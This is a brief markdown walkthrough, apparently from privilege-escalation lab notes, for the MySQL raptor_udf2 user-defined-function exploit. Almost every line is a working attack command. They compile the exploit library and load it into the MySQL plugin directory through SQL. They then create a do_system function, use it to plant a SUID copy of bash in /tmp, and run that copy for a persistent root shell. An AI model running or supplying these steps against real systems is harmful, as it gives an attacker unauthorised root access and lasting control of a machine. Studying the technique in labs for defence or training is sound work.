### UDF

1. Download the [exploit](https://www.exploit-db.com/exploits/1518) to your machine
2. Compile the exploit: `gcc -g -c raptor_udf2.c -fPIC` and `gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc`
3. Connect to MySQL service: `mysql -u root`
4. Create User Defined Function using the exploit: `use mysql; `
`create table foo(line blob);`
`insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));`
`select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';`
`create function do_system returns integer soname 'raptor_udf2.so';``
5. Use the function to copy /bin/bash to /tmp/rootbash with SUID permissions: `select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');`
6. Run the executable to get persistent root shell: `/tmp/rootbash -p`